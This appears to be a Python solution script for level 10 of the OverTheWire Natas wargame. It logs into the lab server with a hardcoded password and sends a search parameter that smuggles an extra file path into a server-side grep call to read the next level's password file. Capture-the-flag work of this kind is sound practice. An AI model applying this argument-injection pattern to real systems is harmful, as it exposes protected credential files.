#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re

user = "natas10"
passwd = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

viewSourceCode = 'index-source.html'

params = {"needle": ". /etc/natas_webpass/natas11 #", "submit": "submit"}

url = f"http://{user}.natas.labs.overthewire.org/"

response = req.get(url, auth=(user, passwd), params=params)
content = response.text

# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
#     print(content, file=f)

# . => 在 default 模式，匹配除了'\n'的任意字符。
# \* => 對它前面的 regular expression 匹配 0 到任意次重復。
answer = re.findall("<pre>\n(.*)\n</pre>", content)[0]
print(answer)
